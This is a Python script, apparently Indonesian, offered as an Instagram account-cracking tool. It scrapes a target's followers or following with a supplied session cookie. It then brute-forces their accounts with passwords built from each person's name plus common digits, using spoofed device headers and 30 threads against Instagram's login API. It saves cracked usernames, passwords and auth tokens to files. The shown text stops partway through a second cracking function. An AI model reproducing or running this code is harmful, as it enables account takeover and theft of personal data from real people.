#!/usr/bin/python3
import urllib.parse
from urllib.parse import quote
import re, os, sys, json, random, urllib, urllib.request, hmac, hashlib, time, string, uuid, requests, base64,datetime,subprocess
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bsp
from rich.progress import Progress,TextColumn,SpinnerColumn
from rich import print as prints
from rich.panel import Panel as panel
from string import *
xx = 0
rr = random.randint;rc = random.choice

Uid, Uuid = [], []
Ok, Cp, Loop = 0, 0, 0

###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
ung = '\033[1;33m'
hijo = '\033[1;32m' 
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # ungING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # ungING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
# ------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
			
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
ung = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
BLUE = "\033[0;34m"
END  = "\033[0m"
RED  = "\033[0;31m"
CYAN = "\033[0;36m"

GREEN       = "\033[0;32m"
LIGHT_CYAN  = "\033[1;36m"
LIGHT_WHITE = "\033[1;37m"
P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
K = "\033[33m"
M, K2 = K, K
H='\033[96;1m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
J='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
getuserid = 'https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': '1217981644879628','x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
ua = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
userinfo  = 'https://i.instagram.com/api/v1/users/{id!s}/info/'

def Clear():
	try:
		os.system('clear')
	except:pass

def find_res(kya= []):
	try:
		if os.path.isfile('Data/OK--50.txt') is True:
			for a in open('Data/OK-50.txt','r').read().splitlines():
				xyz = re.findall('ds_user_id=(.*)',str(a))
				if len(xyz) == 0:continue
				if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
		if os.path.isfile('Data/OK-100.txt') is True:
			for a in open('Data/OK-100.txt','r').read().splitlines():
				xyz = re.findall('ds_user_id=(.*)',str(a))
				if len(xyz) == 0:continue
				if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
	except:pass
	if len(kya) == 0:
		for kyta in kya:
			try:
				print(f'\n{P}Login: {H}{kyta}')
				uid = re.search('ds_user_id=(\d+)', str(kyta)).group(1)
				req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies={'cookie':kyta}).json()['user']['full_name']
				open('Data/IG-login.txt','w').write(f'{kyta}')
				print(f'\n{P}Login sebagai : {req}')
				time.sleep(2)
				return(memek)
			except Exception as e:
				print(f'\n{P}Expired: {K}{kyta}')
				
def Aset_Ig():
	Clear()
	if os.path.isfile('Data/IG-login.txt') is True:
		coki = {'cookie':open('Data/IG-login.txt','r').read()}
	else:
		print(f"{P}[/] Silahkan Masukan Cookies Akun Instagram Pastikan Menggunakan Akun Tumbal!")
		raraky = {'cookie':input("\ncookie: ")}
		if raraky['cookie'] == 'res':
			coki = {'cookie':find_res()}
		else:
			coki = raraky
	try:
		#cek = requests.get('https://www.instagram.com/api/v1/tags/web_info/?tag_name=khmd', headers=ua,  cookies=coki).json()
		uid = re.search('ds_user_id=(\d+)', str(coki['cookie'])).group(1)
		req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki).json()['user']
		open('Data/IG-login.txt','w').write(f'{coki["cookie"]}')
	except:
		os.system('rm -rf Data/IG-login.txt')
		print(f"{M}cookies Invalid Gunakan Cookies yang Lain!");time.sleep(3);Aset_Ig()
	return coki, req['full_name'], req['follower_count']


#----------[ BANNER ]----------#
def banner():
      if "win" in sys.platform:os.system("clear")
      else:os.system("clear")
      prints(panel('''\t[bold blue]      
  

                 ____      _    _____ _   _ _     ___  
|  _ \    / \  |  ___| | | | |   |_ _| |  _
| |_) |  / _ \ | |_  | |_| | |    | |  | |_) |
|  _ <  / ___ \|  _| |  _  | |___ | |  |  _
|_| \_\/_/   \_\_|   |_| |_|_____|___|   
                                          
''',width=80,style=f"bold blue"))

def Menu():
	Clear()
	aset, nama, fol = Aset_Ig()
	banner()
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╰─{b}➤{puti} Script Cracking Instagram V 1.0")
	print(f"{biru}╰─{b}➤{puti} NAMA : @{nama[:8]}")
	print(f"{biru}╰─{b}➤{puti} PENGIKUT : {fol}")
	print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╰─{b}➤ {puti}01. Crack Pengikut\n{biru}╰─{b}➤{puti} 02. Crack Mengikuti\n{biru}╰─{b}➤ {puti}03. Crack Komentar\n{biru}╰─{b}➤{puti} 00. Keluar")
	print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	x = input(f'{biru}╰─{b}➤{P} Input menu : ')
	if x in ['01','1']:dumps(aset, True)
	elif x in ['02','2']:dumps(aset, False)
	elif x in ['00','0']:os.system("rm Data/IG-login.txt");print("berhasil menghapus cookies");exit()

def dumps(cintil, typess, xyz = []):
	if 'csrftoken' not in str(cintil):
		try:
			memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = cintil).json()
			token = memek['config']['csrf_token']
			cintil['cookie'] +=';csrftoken=%s;'%(token)
		except Exception as e:
			os.system('rm -rf Data/IG-login.txt')
			exit(f'\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╰─{b}➤ {puti} MASUKAN USERNAME TARGET")
	print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	users = input(f"{biru}╰─{b}➤{P} Username : ").split(',')
	try:
		for y in users:
			req = requests.get(f'https://www.instagram.com/{y}/', cookies = cintil).text
			uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
			if uid not in xyz:xyz.append(uid)
	except:pass
	try:
		mode = 'followers' if typess is True else 'following'
		for kintil in xyz:
			if typess is True:
				Graphql(True, kintil, cintil['cookie'], '')
			else:
				Graphql(False, kintil, cintil['cookie'], '')
	except:pass
	print("");MetodeType()
		
def Graphql(typess, userid, cokie,after):
	global xx
	api = "https://www.instagram.com/graphql/query/"
	csr = 'variables={"id":"%s","first":24,"after":"%s"}'%(userid,after)
	mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if typess is False else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
	try:
		ptk = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
		req = requests.get(api, params=mek, headers=ptk).json()
		if 'require_login' in req:
			if len(Uuid) > 0:
				pass
			else:
				exit(f'\n{P}[{K2}!{P}] Invalid Cookie')
		khm = 'edge_followed_by' if typess is True else 'edge_follow'
		for xyz in req['data']['user'][khm]['edges']:
			username = xyz['node']['username']
			xy = xyz['node']['username'] + '|' + xyz['node']['full_name']
			if xy not in Uuid:
				xx += 1
				Uuid.append(xy)
				print('\r{}╰─{}➤ {}Berhasil mengumpulkan {} {}{}{}                            '.format(biru, b, puti, b, b, len(Uuid), P), end='')
				time.sleep(0.0009)
		end = req['data']['user'][khm]['page_info']['has_next_page']
		if end is True:
			after = req['data']['user'][khm]['page_info']['end_cursor']
			Graphql(typess, userid, cokie, after)
		else:pass
	except:pass

def MetodeType():
	global SistemLog
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f'{biru}|─{b}➤{puti} 01. SPTZY PEMBURU TOBRUT {b} DATA ONLY\n{biru}|─{b}➤ {puti}02. SPTZY PEMBURU GAME SUPPORT {b}DATA/WIFI\n{biru}|─{b}➤ {puti}03. SPTZY PEMBURU FREE SUPPORT {b}DATA/WIFI\n{biru}|─{b}➤ {puti}04. SPTZY PEMBURU NGENTOD {b}DATA/WIFI')
	print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	method = input(f'{biru}|─{b}➤{puti} Pilih : ')
	if method in ['01','1']: SistemLog = "api.instagram.com"
	elif method in ['02','2']: SistemLog = "i.instagram.com"
	elif method in ['03','3']: SistemLog = "www.instagram.com"
	elif method in ['04','4']: SistemLog = "b.i.instagram.com"
	else:SistemLog = "api.instagram.com"
	SetCrack()

def SetCrack():
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f'{biru}|─{b}➤{puti} JANGAN LUPA MAINKAN {b}MODPES{puti}')
	print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
	with ThreadPoolExecutor (max_workers=30) as ASF:
		for i in Uuid:
			try:
				username, name = i.split('|')
				kontol = Password(name)
				if SistemLog == "api.instagram.com":
					ASF.submit(Crack_api, username, kontol)
				elif SistemLog == "i.instagram.com":
					ASF.submit(Crack_i, username, kontol)
				elif SistemLog == "www.instagram.com":
					ASF.submit(Crack_w, username, kontol)
				elif SistemLog == "b.i.instagram.com":
					ASF.submit(Crack_N, username, kontol)
			except:pass
	exit(f' \n\n{biru}╰─{b}▶{puti} Crack Telah Selesai')
	
def Password(name):
        xxzx, ccvc = [], []
        for nama in name.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5:xxzx.append(nama+'12');xxzx.append(nama+'321');xxzx.append(nama+'123');xxzx.append(nama+'1234');xxzx.append(nama+'12345');xxzx.append(nama+'123456');xxzx.append(nama+'12345789');xxzx.append(nama+'01');xxzx.append(nama+'04');xxzx.append(nama+'05');xxzx.append(nama+'07');xxzx.append(nama+'08');xxzx.append(nama+'09');xxzx.append(nama+'15');xxzx.append(nama+'17');xxzx.append(nama+'18');xxzx.append(nama+'19');xxzx.append(nama+'24');xxzx.append(nama+'28')
            else:xxzx.append(nama+'12');xxzx.append(nama+'321');xxzx.append(nama+'123');xxzx.append(nama+'1234');xxzx.append(nama+'12345');xxzx.append(nama+'123456');xxzx.append(nama+'12345789');xxzx.append(nama+'01');xxzx.append(nama+'04');xxzx.append(nama+'05');xxzx.append(nama+'07');xxzx.append(nama+'08');xxzx.append(nama+'09');xxzx.append(nama+'15');xxzx.append(nama+'17');xxzx.append(nama+'18');xxzx.append(nama+'19');xxzx.append(nama+'24');xxzx.append(nama+'28')
        return(xxzx)

def convert_cookie(item):
    try:
        sesid = 'sessionid=' + re.findall('sessionid=(\d+)', str(item))[0]
        ds_id = 'ds_user_id=' + re.findall('ds_user_id=(\d+)', str(item))[0]
        csrft = 'csrftoken=' + re.findall('csrftoken=(.*?);', str(item))[0]
        donez = '%s;%s;%s;ig_nrcb=1;dpr=2'%(ds_id, sesid, csrft)
    except Exception as e:
        donez = 'cookies tidak di temukan, error saat convert'
    return donez

ses = requests.Session()
def data_target(name):
	for y in name.split(','):
		try:
			HEADERS.update({'user-agent'  : 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)','x-ig-app-id' :'1217981644879628'})
			profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers = HEADERS).json()['data']['user']
			post      = profil_info_target["edge_owner_to_timeline_media"]["count"]
			peng  = profil_info_target["edge_followed_by"]["count"]
			meng = profil_info_target["edge_follow"]["count"]
			mail = profil_info_target["business_email"]
			phone = profil_info_target["business_phone_number"]
			fullname = profil_info_target["full_name"]
			fbid = profil_info_target["fbid"]
		except Exception as e:
			post, peng, meng, mail, fullname, fbid, phone = None, None, None, None, None,  None, None
	return post, peng, meng, mail, fullname, fbid, phone

def UserAgent():
    # User agent Instagram Android versi terbaru 2025
    versi = "325.0.0.34.120"
    android_version = rc(['35/15.0.0', '34/14.0.0', '33/13.0.0'])
    dpis = rc(['320dpi', '480dpi', '640dpi', '420dpi'])
    pxl = rc(['1080x2400', '1080x2340', '1440x3200', '1170x2532'])
    merek = rc(['Samsung', 'Xiaomi', 'Google', 'OPPO'])
    model = rc(['SM-S928B', '2312DRA50C', 'Pixel 8 Pro', 'CPH2603'])
    device = rc(['dm3q', 'aurora', 'husky', 'oasis'])
    chipset = rc(['qcom', 'mt6989', 'gs202', 'dimensity9200'])
    language = rc(['en_US', 'id_ID', 'en_GB'])
    kode = rc(['1217981644879628', '104766893', '109556223'])
    ua = (
        f"Instagram {versi} Android ({android_version}; {dpis}; {pxl}; {merek}; {model}; {device}; {chipset}; {language}; {kode})"
    )
    return ua

def Android_Version(android_version):
    # Android version mapping terbaru 2025
    mapping = {
        '15': '35',
        '14': '34',
        '13': '33',
        '12': '32',
        '11': '31',
        '10': '30',
        '9': '29',
        '8': '28',
        '7': '27'
    }
    return mapping.get(str(android_version), '35')

def UserAgentBarcelona():
    # User agent Instagram Android versi terbaru 2025
    versi = "325.0.0.34.120"
    android_version = random.choice(['35/15.0.0', '34/14.0.0', '33/13.0.0'])
    dpis = random.choice(['320dpi', '480dpi', '640dpi', '420dpi'])
    pxl = random.choice(['1080x2400', '1080x2340', '1440x3200', '1170x2532'])
    device = random.choice([
        "Samsung; SM-S928B; dm3q; qcom",
        "Xiaomi; 2312DRA50C; aurora; mt6989",
        "Google; Pixel 8 Pro; husky; gs202",
        "OPPO; CPH2603; oasis; dimensity9200"
    ])
    language = random.choice(['en_US', 'id_ID', 'en_GB'])
    kode = random.choice(['1217981644879628', '104766893', '109556223'])
    ua = (
        f"Instagram {versi} Android ({android_version}; {dpis}; {pxl}; {device}; {language}; {kode})"
    )
    return ua

def Crack_api(username, memek):
	global Ok, Cp, Loop
#	sys.stdout.write(f"\r{P}[{H}RIDWAN-DEV{P}] [ {Loop}/{str(len(Uuid))}{P} ] [ {P}CP:{M}{cp} {P}OK:{H}{ok}"),
	sys.stdout.write(f"\r{biru}|─{b}➤ {puti}CRACK V1 {b}{Loop}{P} : {H}{str(len(Uuid))}{P}{P}/Ok:-{H}{Ok}{P}/Cp:-{biru}{Cp}{P}"),
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			uag = UserAgentBarcelona()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({'x-fb-http-engine': 'Liger','Host': 'i.instagram.com','x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73','x-ig-capabilities': '3brTv10=','x-ig-device-id': device_id,'x-tigon-is-retry': 'True, True','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','connection': 'keep-alive','x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),'x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),'x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),'user-agent': uag,'x-ig-family-device-id': family_device_id,'x-bloks-is-layout-rtl': 'False','x-fb-connection-type': 'MOBILE.LTE','x-fb-server-cluster': 'True','accept-language': 'id-ID, en-US','ig-intended-user-id': '0','x-ig-app-id': '3419628305025917','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','priority': 'u=3','x-ig-timezone-offset': str(-time.timezone),'x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True'})
			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\
                      bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data, allow_redirects = True)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
						cookies = (";".join([str(x)+"="+str(y) for x,y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f'{B}╭────────────────────────────────────────────────────────────────────────────{b}▶')
				print(f"\r{biru}|─{b}➤{puti} FULL NAME {b}{fullname[:10]}")
				print(f"{biru}|─{b}➤{puti} USERNAME {b}{username}")
				print(f"{biru}|─{b}➤{puti} PASSWORD {b}{password}")
				print(f"{biru}|─{b}➤{puti} PENGIKUT {b}{peng}")
				print(f"{biru}|─{b}➤{puti} MENGIKUTI {b}{meng}")
				print(f"{biru}|─{b}➤{puti} POSTINGAN {b}{post}")
				print(f"{biru}|─{b}➤{puti} FACEBOOK {b}{fbid}")
				print(f"{biru}|─{b}➤{puti} KUKI {b}{ig_set_authorization}")
				print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
				open('buatpush.txt','a').write(f"{username}|{password}\n{peng}|{meng}\n{cookies}\n")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f'{B}╭────────────────────────────────────────────────────────────────────────────{b}▶')
				print(f"\r{biru}|─{b}➤{puti} FULL NAME {biru}{fullname[:10]}")
				print(f"{biru}|─{b}➤{puti} USERNAME {biru}{username}")
				print(f"{biru}|─{b}➤{puti} PASSWORD {biru}{password}")
				print(f"{biru}|─{b}➤{puti} PENGIKUT {biru}{peng}")
				print(f"{biru}|─{b}➤{puti} MENGIKUTI {biru}{meng}")
				print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
				open('/Ress/Cp-Instagram.txt','a').write('%s|%s\n'%(username, password))
				break
			elif 'ip_block' in str(response.text.replace('\\', '')):
				print(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}", end='')
			elif 'Please wait a few' in str(response.text.replace('\\', '')) or 'Harap tunggu beberapa' in str(response.text.replace('\\', '')):
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f"Harap tunggu beberapa menit", end='\r')
				time.sleep(0.10)
			elif 'Unmapped IG Error' in str(response.text.replace('\\', '')) or 'This IG Error was not mapped to an Error Code.' in str(response.text.replace('\\', '')):
				sys.stdout.write(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
				sys.stdout.flush()
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(20)
	Loop+=1

def Crack_i(username, memek):
	global Ok, Cp, Loop
#	sys.stdout.write(f"\r{P}[{H}RIDWAN-DEV{P}] [ {Loop}/{str(len(Uuid))}{P} ] [ {P}CP:{M}{cp} {P}OK:{H}{ok}"),
	sys.stdout.write(f"\r{biru}|─{b}➤ {puti}CRACK V2 {b}{Loop}{P} : {H}{str(len(Uuid))}{P}{P}/Ok:-{H}{Ok}{P}/Cp:-{biru}{Cp}{P}"),
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			uag = UserAgentBarcelona()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({'x-fb-http-engine': 'Liger','Host': 'i.instagram.com','x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73','x-ig-capabilities': '3brTv10=','x-ig-device-id': device_id,'x-tigon-is-retry': 'True, True','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','connection': 'keep-alive','x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),'x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),'x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),'user-agent': uag,'x-ig-family-device-id': family_device_id,'x-bloks-is-layout-rtl': 'False','x-fb-connection-type': 'MOBILE.LTE','x-fb-server-cluster': 'True','accept-language': 'id-ID, en-US','ig-intended-user-id': '0','x-ig-app-id': '3419628305025917','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','priority': 'u=3','x-ig-timezone-offset': str(-time.timezone),'x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True'})
			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\
                      bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data, allow_redirects = True)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
						cookies = (";".join([str(x)+"="+str(y) for x,y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f'{B}╭────────────────────────────────────────────────────────────────────────────{b}▶')
				print(f"\r{biru}|─{b}➤{puti} FULL NAME {b}{fullname[:10]}")
